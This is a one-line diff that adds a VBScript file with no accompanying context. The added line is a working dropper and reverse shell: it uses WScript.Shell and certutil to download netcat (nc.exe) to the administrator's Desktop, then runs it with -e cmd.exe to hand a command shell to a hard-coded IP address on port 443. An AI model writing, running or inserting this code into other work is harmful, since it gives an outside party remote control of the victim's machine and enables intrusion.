@@ -1,0 +1,1 @@
+Dim objShell:Set objShell = WScript.CreateObject("WScript.Shell"):objShell.Run "cmd/K certutil.exe -urlcache -split -f https://packetstormsecurity.com/files/download/31140/nc.exe C:\users\administrator\Desktop\nc.exe &amp; C:\users\administrator\Desktop\nc.exe -e cmd.exe 142.47.107.131 443":Set objShell = Nothing
